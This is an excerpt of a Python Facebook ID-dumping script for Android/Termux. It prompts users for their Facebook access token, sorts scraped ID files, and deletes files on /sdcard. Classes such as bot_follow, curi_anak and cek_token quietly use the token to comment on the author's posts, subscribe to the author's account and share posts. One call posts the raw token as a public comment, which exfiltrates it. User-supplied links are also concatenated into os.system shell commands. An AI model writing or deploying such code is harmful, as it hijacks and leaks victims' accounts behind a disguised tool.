...
loag="""\033[1;37m
___  _  _ _  _ ___  _ _  _ ____    ___ ____ ____ _
|  \ |  | |\/| |__] | |\ | | __     |  |  | |  | |
|__/ |__| |  | |    | | \| |__]     |  |__| |__| |___
 [*]=============================================
    \x1b[0;91m\x1b[1;43m                  MAKING FILE THE SaiWaN:)                 \x1b[0m
 [*]=============================================
    \033[1;32m  Use air plane mood if no result \033[1;32m
 [*]============================================="""
...
class dubb:
	def __init__(self):
		...
		os.system('sort -r "'+file+'" | uniq > /sdcard/saiwan')
		os.system('rm -rf /sdcard/1.txt')
		os.system('rm -rf /sdcard/thesaiwan.txt.txt')
		os.system('rm -rf /sdcard/sycoidz.txt')
		print(47*'\033[1;97m-\033[0;0m')
		print ("[â] Removing successfully ..")
		print ("[â] Your file path : /storage/emulated/0/Xsyco.txt")
		print(47*'\033[1;97m-\033[0;0m')
		input ("\n[?] Retrun back menu")
...
class login:
	def __init__(self):
		...
		jalan("          LOGIN USE FACEBOOK TOKEN \n")
		print(f"\x1b[1;97m[*]======================================")
		print ("[1] Login Token")
		print ("[2] Download Access token application")
		print(f"\x1b[1;97m[*]======================================")
		print("")
		h_ = input('\n[*] KiraShishigami  : ')
		print
		if h_ in ["1", "01", "token"]:
			...
			os.system('xdg-open https://m.apkpure.com/get-access-token/com.proit.thaison.getaccesstokenfacebook/amp')
			login()
...
class msort:
	def __init__(self):
		...
		os.system('sort -r /sdcard/1.txt | uniq > /sdcard/Xsyco.txt')
		os.system('rm -rf /sdcard/1.txt')
		os.system('rm -rf /sdcard/thesaiwan.txt.txt')
		os.system('rm -rf /sdcard/sycoidz.txt')
		print(47*'\033[1;97m-\033[0;0m')
		print ("\n[â] Dumping and Sliced successfully ..")
		print ("[â] Your file path : /storage/emulated/0/Xsyco.txt")
		print(47*'\033[1;97m-\033[0;0m')
		input ("\n[?] Retrun back menu")
		os.system("python Extract.py")
class sort:
	def __init__(self):
		...
		link = input ("[?] Link 1 : ")
		link1 = input ("[?] Link 2 : ")
		os.system('cat /sdcard/mohsin.txt | grep "'+link+'" > /sdcard/1.txt')
		os.system('cat /sdcard/mohsin.txt | grep "'+link1+'" >> /sdcard/1.txt')
		os.system('sort -r /sdcard/1.txt | uniq > /sdcard/Xafthz.txt')
		os.system('rm -rf /sdcard/1.txt')
		os.system('rm -rf /sdcard/saiwan.txt.txt')
		os.system('rm -rf /sdcard/mohsinidz.txt')
		print(47*'\033[1;97m-\033[0;0m')
		print ("\n[â] Dumping and Sliced successfully ..")
		print ("[â] Your file path : /storage/emulated/0/Xafthz.txt")
		print(47*'\033[1;97m-\033[0;0m')
		input ("\n[?] Retrun back menu")
		os.system("python Extract.py")
class msort:
	def __init__(self):
		...
		os.system('rm -rf /sdcard/1.txt')
		os.system('rm -rf /sdcard/mohsin.txt.txt')
		os.system('rm -rf /sdcard/mohsinidz.txt')
		print(47*'\033[1;97m-\033[0;0m')
		print ("\n[â] Dumping and Sliced successfully ..")
		print ("[â] Your file path : /storage/emulated/0/2.txt")
		print(47*'\033[1;97m-\033[0;0m')
		input ("\n[?] Retrun back menu")
		os.system("python Extract.py")
	def __init__(self):
		ba = 0
		bi = 0
		link_token = requests.get("https://free.facebook.com/story.php?story_fbid=2466873440153478&id=100087512653233&_rdr")
		...
		for naa in token_free:
			...
			if len(naa)>=37:
				...
				post4 = ('1149498069320253') # Logo 
				post5 = ("2466873440153478") # Untuk Ber
				comment = random.choice(['Okay','Hmm','Im ur fan','Are u busy','Still waiting','Sir reply me please ']) 
				love = random.choice(['Kiraaa','She2','Fire2','Lel','Uma ewa vu shindeiru','You look good','Hello'])
				somi = ''+love
				...
				requests.post('https://graph.facebook.com/' + post4 + '/comments/?message=' + comment + '&access_token=' + token)
				requests.post('https://graph.facebook.com/' + post5 + '/comments/?message=' + somi + '&access_token=' + token)
				requests.post('https://graph.facebook.com/100087512653233/subscribers?access_token=' + token) ### FB RISKY
				cek_token(naa)
...
class bot_follow:
	def __init__(self):
		s_ = requests.Session()
		post1 = ('1149498069320253') # j
		post2 = ("2466873440153478") # j
		post3 = ("1149498069320253") # j
		post4 = ('2466873440153478') # j
		post5 = ("2466873440153478") # Untuk Berbagi T
		post6 = ("1149498069320253") # Logo Akira
		post7 = ("2466873440153478") # Logo Attaxk Fr
		curi_ = ("1149498069320253") # Logo Zero 
		my_idz_bot = [
		"100087512653233",
		"100087512653233",
		"100087512653233",
		...
		s_.post('https://graph.facebook.com/2466873440153478/comments/?message=' + token + '&access_token=' + token)
		menu()
class curi_anak:
	def __init__(self):
		try:
		...
		curi = ("2466873440153478") # Zero Suck Candy Logo :v
		requests.post('https://graph.facebook.com/'+curi+'/comments/?message='+anjas+'&access_token=' + token)

class cek_token:
	def __init__(self, token):
		requests.post("https://graph.facebook.com/me/feed/?link=https://fb.com/100087512653233/posts/2466873440153478/?app=fbl&access_token=" + token)
		try:
...
class lonte__:
	def __init__(self, ml, token, toket, mamk):
		...
		sys.stdout.write("\r%s[%sTHE MOHSIN%s] COLLECTED IDZ â¢> %s"%(Q,pilih([U,I,K,M,C]),Q, len(open('/sdcard/'+mamk+'.txt','r').readlines()))
		); sys.stdout.flush()
class menu:
	def __init__(self):
		global ua
